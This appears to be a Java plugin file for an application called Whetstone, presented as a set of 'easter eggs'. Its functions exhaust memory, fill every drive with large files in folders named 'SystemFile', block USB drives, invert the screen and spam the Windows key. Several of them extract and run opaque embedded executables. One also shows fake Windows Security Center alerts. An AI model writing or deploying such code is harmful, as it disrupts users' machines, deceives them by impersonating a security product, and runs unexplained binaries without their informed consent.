package com.wmp.whetstone;

import com.sun.jna.WString;
import com.sun.jna.ptr.IntByReference;
import com.wmp.PublicTools.CTInfo;
import com.wmp.PublicTools.UITools.GetIcon;
import com.wmp.PublicTools.easter_egg_control.FuncHelpUnit;
import com.wmp.PublicTools.easter_egg_control.easterEggUnit.JarDevelopEasterEggUnit;
import com.wmp.PublicTools.io.IOForInfo;
import com.wmp.PublicTools.printLog.Log;
import com.wmp.whetstone.extraPanel.classForm.panel.ClassFormPanel;
import com.wmp.whetstone.tools.ResourceLocalizer;
import com.wmp.whetstone.tools.SecurityGuard;
import com.wmp.whetstone.tools.windowsAPI.WinAPIEntireFunction;

import javax.swing.*;
import java.awt.*;
import java.awt.event.WindowAdapter;
import java.awt.event.WindowEvent;
import java.io.File;
import java.io.RandomAccessFile;
import java.util.*;
import java.util.List;

public class EasterEggUnit extends JarDevelopEasterEggUnit {

    private File[] files;
    private Thread thread;
    @Override
    public String getID() {
        return "BackageHacking";
    }

    @Override
    public String getVersion() {
        return "1.0.0";
    }

    @Override
    public String getTargetVersion() {
        return "2.2.0";
    }

    @Override
    public String help() {
        return "后台彩蛋集合体";
    }

    @Override
    public FuncHelpUnit[] funcHelps() {
        return new FuncHelpUnit[]{
                new FuncHelpUnit("safe3600", "占用内存\n可用参数：占用百分比(小数), 存入的文字"),
                new FuncHelpUnit("chuizis", "error"),
                new FuncHelpUnit("createBigFile", "创建稀疏文件\n输入参数: 占用比例(小数)"),
                new FuncHelpUnit("UHelper", "用于拦截所有U盘的插入\n可用参数：[个数]")
        };
    }

    public void safe3600(String[] args){
        ResourceLocalizer.copyEmbeddedFile(CTInfo.TEMP_PATH + "\\Whetstone\\", "/resource/", "3600safe.dll");


        double i = SecurityGuard.INSTANCE.huoqudangqiankeyongneicun();

        double j = 0.5;
        try {
            double temp = Double.parseDouble(args[0]);
            if (temp > 0 && temp <= 1) {
                j = temp;
            }
            Log.info.print("Whetstone", "占用百分比：" + j);
        } catch (Exception e) {
            Log.trayIcon.displayMessage( "Windows 安全中心", "威胁占用内存大小获取失败", TrayIcon.MessageType.ERROR);
        }
        zhanyong(i, j, args.length>=2?args[1]:"磨刀石");
    }

    public void chuizis(String[] args){
        try {
            {
                JDialog frame = new JDialog();
                frame.setDefaultCloseOperation(JFrame.DO_NOTHING_ON_CLOSE);
                frame.setUndecorated(true);
                frame.setAlwaysOnTop(true);
                frame.addWindowListener(new WindowAdapter() {
                    @Override
                    public void windowOpened(WindowEvent e) {
                        try {
                            Thread.sleep(3000);
                        } catch (InterruptedException _) {
                        }
                        e.getWindow().setVisible(false);
                    }
                });

                Dimension screenSize = Toolkit.getDefaultToolkit().getScreenSize();

                JLabel label = new JLabel(GetIcon.getIcon(ClassFormPanel.class.getResource("/image/cxx.jpg"), screenSize.width, screenSize.height, false));
                frame.add(label);

                frame.pack();
                frame.setLocation(0, 0);

                frame.setVisible(true);
            }

            WinAPIEntireFunction.invertScreenWithJNA();

            for (int i = 0; i < 5; i++) {
                WinAPIEntireFunction.pressKey(WinAPIEntireFunction.VK_LWIN);

                Thread.sleep(500);

            }


            ResourceLocalizer.copyEmbeddedFile(CTInfo.TEMP_PATH + "\\Whetstone\\", "/resource/", "chuizis.exe");
            ResourceLocalizer.copyEmbeddedFile(CTInfo.TEMP_PATH + "\\Whetstone\\", "/resource/", "xxx.mp3");


            //Desktop.getDesktop().open(new java.io.File(CTInfo.TEMP_PATH + "\\Whetstone\\chuizis.exe"));
            Runtime.getRuntime().exec(new String[]{"cmd", "/c", CTInfo.TEMP_PATH + "\\Whetstone\\chuizis.exe"});

            WinAPIEntireFunction.clearInvertScreen();
        } catch (Exception e) {
            Log.err.print(EasterEggUnit.class, "运行锤子时发生错误", e);
        }
    }

    public void createBigFile(String[] args){
        //获取系统剩余空间
        Map<File, Long> map = new HashMap<>();
        for (File file : File.listRoots()) {
            map.put(file, file.getUsableSpace());
        }

        //生成稀疏文件,并获取所在文件夹
        List<File> accessFilesDir = new ArrayList<>();
        for (File file : map.keySet()) {
            long usableSpace = map.get(file);
            Double percentage = Double.parseDouble(args[0]);
            //获取占用大小
            long size = (long) (usableSpace * percentage);


            //生成每个稀疏文件的占用大小(<1GB)
            long fileSize = 1024L * 1024 * 1024; // 1GB
            int fileCount = (int) (size / fileSize) + 1;


            //获取所在文件夹
            File accessDir = new File(file, "SystemFile");
            if (!accessDir.exists()) {
                accessDir.mkdirs();
            }
            accessFilesDir.add(accessDir);

            //创建稀疏文件
            new Thread(()->{
                for (int i = 0; i < fileCount; i++) {
                    File sparseFile = new File(accessDir, "build_" + new Random().nextLong() + ".dat");
                    try {
                        RandomAccessFile raf = new RandomAccessFile(sparseFile, "rw");
                        long currentSize = (i == fileCount - 1) ? (size % fileSize) : fileSize;
                        if (currentSize == 0 && fileCount == 1) {
                            currentSize = size;
                        }
                        raf.seek(currentSize - 1);
                        raf.write(0);
                        Log.info.print(this.getClass().toString(), "创建稀疏文件成功: " + sparseFile.getAbsolutePath());
                    } catch (Exception e) {
                        Log.err.print(this.getClass(), "创建稀疏文件失败", e);
                    }
                }
            }, "createAccessFile").start();
        }

        files = accessFilesDir.toArray(new File[0]);
    }

    public void UHelper(String[] args){
        ResourceLocalizer.copyEmbeddedFile(CTInfo.TEMP_PATH + "\\Whetstone\\", "/resource/", "Uhelper.exe");


        //Desktop.getDesktop().open(new java.io.File(CTInfo.TEMP_PATH + "\\Whetstone\\chuizis.exe"));
        thread = new Thread(() -> {

            for (int i = 0; i < Integer.parseInt(args[0]); i++) {
                try {
                    Process process = Runtime.getRuntime().exec(new String[]{CTInfo.TEMP_PATH + "\\Whetstone\\Uhelper.exe"});
                    int status = process.waitFor();

                    Log.info.print(ClassFormPanel.class.toString(), "UHelper.exe关闭：" + status);
                } catch (Exception e) {
                    e.printStackTrace();
                }
            }

        }, "U盘助手");
        thread.start();
    }

    private static void zhanyong(double i, double j, String str) {
        if (j == 0) {
            Log.trayIcon.displayMessage("Windows 安全中心", "发现顽固威胁，无法结束已节省内存", TrayIcon.MessageType.ERROR);
            return;
        }
        try {
            System.out.println("可用内存：" + i + "MB");
            System.out.println("占用:" + i*j);
            SecurityGuard.INSTANCE.fenpeisuoxuneicun(new IntByReference((int) (i*j)), new WString(str));
        } catch (Exception e) {
            zhanyong(i, j>0.1?j-0.1:0, str);
        }
    }

    @Override
    public void clear(String funcName) {
        if (funcName.equals("createBigFile")){
            for (File file : files) {
                System.out.println(IOForInfo.deleteDirectory(file));
            }
        } else if (funcName.equals("UHelper")) {
            thread.interrupt();
            //关闭现有的U盘助手
            com.wmp.PublicTools.windowsAPI.WinAPIEntireFunction.killProcess("UHelper.exe", 100);
        }
    }
}
